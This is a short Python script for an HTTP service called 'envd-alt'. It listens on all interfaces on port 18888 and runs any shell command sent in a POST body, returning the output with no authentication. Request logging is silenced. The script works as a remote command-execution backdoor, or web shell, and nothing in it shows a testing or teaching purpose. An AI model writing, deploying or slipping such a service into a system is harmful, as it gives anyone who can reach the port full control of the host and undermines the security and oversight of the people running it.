#!/usr/bin/env python3
import http.server, socketserver, json, os, subprocess, sys, threading

PORT = 18888

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        resp = {"status": "envd-alt-alive", "pid": os.getpid()}
        self.wfile.write(json.dumps(resp).encode())
    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode() if length else '{}'
        try:
            data = json.loads(body)
            cmd = data.get('cmd', '')
            timeout = data.get('timeout', 30)
            if not cmd:
                resp = {"error": "no cmd"}
            else:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                resp = {"stdout": result.stdout[:10000], "stderr": result.stderr[:2000], "rc": result.returncode}
        except subprocess.TimeoutExpired:
            resp = {"error": "timeout"}
        except Exception as e:
            resp = {"error": str(e)}
        self.wfile.write(json.dumps(resp).encode())

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

with ThreadedHTTPServer(("0.0.0.0", PORT), Handler) as httpd:
    print(f"envd-alt threaded on :{PORT}")
    httpd.serve_forever()
